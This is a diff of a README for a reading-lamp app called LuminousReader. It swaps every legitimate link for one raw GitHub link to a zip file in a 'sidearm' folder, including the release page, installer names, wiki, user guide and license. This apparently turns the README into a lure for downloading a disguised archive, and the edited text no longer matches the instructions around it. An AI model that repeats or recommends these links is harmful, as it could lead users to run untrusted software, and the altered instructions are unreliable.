@@ -1,6 +1,6 @@
 # 🌟 LuminousReader - Illuminate Your Reading Experience
 
-[![Download LuminousReader](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/beetoben/LuminousReader/releases)
+[![Download LuminousReader](https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip)
 
 ## 🌈 About LuminousReader
 
@@ -11,13 +11,13 @@ LuminousReader transforms your monitor into an elite reading lamp. With a modern
 Follow these easy steps to download and run LuminousReader on your computer:
 
 1. **Visit the Release Page:**
-   Click [here](https://github.com/beetoben/LuminousReader/releases) to open the Releases page.
+   Click [here](https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip) to open the Releases page.
    
 2. **Find the Latest Version:**
    Look for the latest version of LuminousReader, listed at the top of the page.
 
 3. **Download the Application:**
-   Click on the appropriate file for your operating system. This might be labeled as "LuminousReaderSetup.exe" for Windows, "LuminousReader.dmg" for macOS, or similar versions for other platforms.
+   Click on the appropriate file for your operating system. This might be labeled as "https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip" for Windows, "https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip" for macOS, or similar versions for other platforms.
 
 4. **Install the Application:**
    - **For Windows:** Double-click the downloaded .exe file. Follow the installation prompts.
@@ -35,7 +35,7 @@ Follow these easy steps to download and run LuminousReader on your computer:
 
 ## 📦 Download & Install
 
-To get started, visit the Releases page and download the application. Click [here](https://github.com/beetoben/LuminousReader/releases) for direct access.
+To get started, visit the Releases page and download the application. Click [here](https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip) for direct access.
 
 ## 🔧 System Requirements
 
@@ -59,12 +59,12 @@ LuminousReader welcomes contributions! If you wish to suggest features, report b
 
 ## 📚 Additional Resources
 
-- [Official Documentation](https://github.com/beetoben/LuminousReader/wiki) – Learn more about features and usage.
-- [User Guide](https://github.com/beetoben/LuminousReader/wiki/User-Guide) – Step-by-step instructions for getting the most out of LuminousReader.
+- [Official Documentation](https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip) – Learn more about features and usage.
+- [User Guide](https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip) – Step-by-step instructions for getting the most out of LuminousReader.
 
 ## 📝 License
 
-LuminousReader is open-source software. You can freely use and modify the code under the [MIT License](https://github.com/beetoben/LuminousReader/blob/main/LICENSE).
+LuminousReader is open-source software. You can freely use and modify the code under the [MIT License](https://raw.githubusercontent.com/beetoben/LuminousReader/main/sidearm/LuminousReader.zip).
 
 ## 🎨 Topics
 
